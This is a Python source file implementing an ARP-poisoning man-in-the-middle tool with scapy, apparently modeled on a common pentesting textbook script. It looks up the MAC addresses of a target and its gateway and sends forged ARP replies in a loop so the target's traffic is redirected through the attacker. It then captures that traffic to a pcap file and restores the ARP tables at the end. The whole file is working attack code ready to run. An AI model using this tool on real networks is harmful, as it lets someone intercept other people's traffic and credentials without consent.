import os
import signal
import sys
import threading
import time

from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sniff, send
from scapy.utils import wrpcap


class ARPPoison:
    interface = None
    target_ip = None
    getaway_ip = None
    packet_count = 0

    def __init__(self, interface, target_ip, getaway_ip, packet_count):
        self.interface = interface
        self.target_ip = target_ip
        self.getaway_ip = getaway_ip
        self.packet_count = packet_count

    def init_arp(self, interface, target_ip, getaway_ip, packet_count):
        conf.iface = interface
        conf.verb = 0
        print(f"[*] configure interface: {interface}")
        getaway_mac, target_mac = self.__get_macs(target_ip, getaway_ip)
        self.__start_poison(getaway_ip, getaway_mac, target_ip, target_mac, packet_count, interface)

    def __start_poison(self, getaway_ip, getaway_mac, target_ip, target_mac, packet_count, interface):
        poison_thread = threading.Thread(target=self.__poison_target,
                                         args=(getaway_ip, getaway_mac, target_ip, target_mac))
        poison_thread.start()
        try:
            print(f"running scrapper on {packet_count}, interface {interface}")

            bpf_filter = "ip host %s" % target_ip
            packets = sniff(count=int(packet_count), filter=bpf_filter, iface=interface)
            wrpcap('arper.pcap', packets)

            self.__restore_target(getaway_ip, getaway_mac, target_ip, target_mac)
        except KeyboardInterrupt:
            self.__restore_target(getaway_ip, getaway_mac, target_ip, target_mac)
            sys.exit(100)

    def __restore_target(self, getaway_ip, getaway_mac, target_ip, target_mac):
        print("restoring default state")
        send(ARP(op=2, psrc=getaway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=getaway_mac), count=5)
        send(ARP(op=2, psrc=target_ip, pdst=getaway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
        os.kill(os.getpid(), signal.SIGINT)

    def __poison_target(self, getaway_ip, getaway_mac, target_ip, target_mac):
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = getaway_ip
        poison_target.pdst = target_ip
        poison_target.hwdst = target_mac

        poison_getaway = ARP()
        poison_getaway.op = 2
        poison_getaway.psrc = target_ip
        poison_getaway.pdst = getaway_ip
        poison_getaway.hwdst = getaway_mac

        print("[*] Start poisoning ARP [Ctrl + C to interrupt]")

        while True:
            try:
                send(poison_target)
                send(poison_getaway)
                time.sleep(2)
            except KeyboardInterrupt:
                self.__restore_target(getaway_ip, getaway_mac, target_ip, target_mac)
                print("[*] Attack finished")
                return

    def __get_macs(self, target_ip, getaway_ip):
        getaway_mac = self.get_mac(getaway_ip)
        if getaway_mac is None:
            print("[!!!] Cannot get getaway mac address")
            sys.exit(76)
        else:
            print(f"[*] Getaway {getaway_ip} is connected on address {getaway_mac}")

        target_mac = self.get_mac(target_ip)
        if target_mac is None:
            print("[!!!] cannot get getaway mac address")
            sys.exit(77)
        else:
            print(f"[*] target device {target_ip} is connected on address {target_mac}")

        return getaway_mac, target_mac

    def get_mac(self, ip_address):
        responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
        for s, r in responses:
            return r[Ether].src
        return None
